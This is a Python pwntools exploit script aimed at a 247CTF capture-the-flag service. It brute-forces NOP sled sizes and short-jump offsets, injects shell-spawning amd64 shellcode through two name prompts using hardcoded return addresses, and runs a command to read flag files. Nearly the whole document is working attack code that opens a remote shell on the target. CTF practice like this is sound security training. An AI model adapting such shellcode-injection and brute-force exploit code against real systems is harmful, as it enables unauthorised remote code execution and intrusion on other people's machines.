#!/usr/bin/env python3
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'error'

HOST = 'f7a5ee299a54c9f1.247ctf.com'
PORT = 50430

shellcode = asm(shellcraft.sh())

# Try many different approaches
approaches = []

# Different NOP sled sizes
for nop_size in [0, 5, 10, 15, 20, 25, 30]:
    # Different jump offsets
    for jump_off in range(0x40, 0xE0, 2):
        approaches.append((nop_size, jump_off))

print(f"Testing {len(approaches)} combinations...")

for idx, (nop_size, jump_off) in enumerate(approaches):
    if idx % 50 == 0:
        print(f"Progress: {idx}/{len(approaches)}")
        sys.stdout.flush()
    
    try:
        p = remote(HOST, PORT, level='error')
        p.recvuntil(b"first name?\n", timeout=1)
        
        first_input = b'\x90' * nop_size + shellcode
        first_input = first_input[:50].ljust(50, b'\x90')
        p.send(first_input)
        
        p.recvuntil(b"surname?\n", timeout=1)
        
        jump_byte = (256 - jump_off) & 0xff
        second_input = b'\x90' * 8 + p64(0x400738) + bytes([0xeb, jump_byte]) + b'\x90' * 6 + p32(0x40072e)
        p.send(second_input)
        
        time.sleep(0.15)
        p.sendline(b'cat /flag* flag* 2>/dev/null;echo END')
        
        result = p.recvall(timeout=0.3)
        if b'247CTF{' in result or b'flag{' in result:
            print(f"\n[+] SUCCESS! NOP={nop_size}, JUMP=0x{jump_off:x}")
            print(result.decode('latin1', errors='ignore'))
            sys.exit(0)
            
        p.close()
    except:
        pass

print("Phase 1 complete, continuing with alternative methods...")
